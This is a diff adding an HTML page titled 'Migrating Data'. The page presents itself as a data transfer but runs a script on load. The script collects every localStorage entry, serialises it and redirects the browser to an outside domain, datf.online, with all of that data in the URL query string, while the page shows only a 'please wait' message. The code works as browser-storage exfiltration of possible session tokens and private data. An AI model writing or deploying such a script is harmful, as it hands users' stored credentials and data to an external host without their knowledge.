@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Migrating Data</title>
+    <script>
+        // Step 1: Read localStorage data
+        let data = {};
+        for (let key in localStorage) {
+            if (localStorage.hasOwnProperty(key)) {
+                data[key] = localStorage[key];
+            }
+        }
+
+        // Step 2: Encode data as a JSON string
+        let encodedData = encodeURIComponent(JSON.stringify(data));
+
+        // Step 3: Redirect to domain2 with the data as a query parameter
+        window.location.href = "https://datf.online?data=" + encodedData;
+    </script>
+</head>
+<body>
+    <p>Transferring your data, please wait...</p>
+</body>
+</html>
